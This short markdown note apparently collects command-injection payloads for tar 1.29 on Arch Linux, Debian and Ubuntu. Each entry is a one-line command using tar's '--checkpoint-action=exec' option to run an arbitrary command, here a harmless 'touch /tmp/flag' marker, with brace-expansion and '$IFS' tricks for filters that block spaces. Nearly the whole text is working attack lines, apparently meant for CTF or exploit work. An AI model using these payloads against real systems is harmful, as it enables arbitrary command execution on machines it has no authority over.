## archlinux (tar 1.29)
The most reliable version, allows for `{,}` format:
```
tar tf /proc/self/status --checkpoint=1 --checkpoint-action=exec='{touch,/tmp/flag}'
```

## debian (tar 1.29)
The second most useful, allows for `$IFS`:
```
tar tf /proc/self/status --checkpoint=1 --checkpoint-action=exec='touch$IFS/tmp/flag'
```

## ubuntu (tar 1.29)
Annoyingly difficult, does not allow `{,}` or `$IFS`:
```
tar tf /proc/self/status --checkpoint=1 --checkpoint-action=exec='touch /tmp/flag'
```
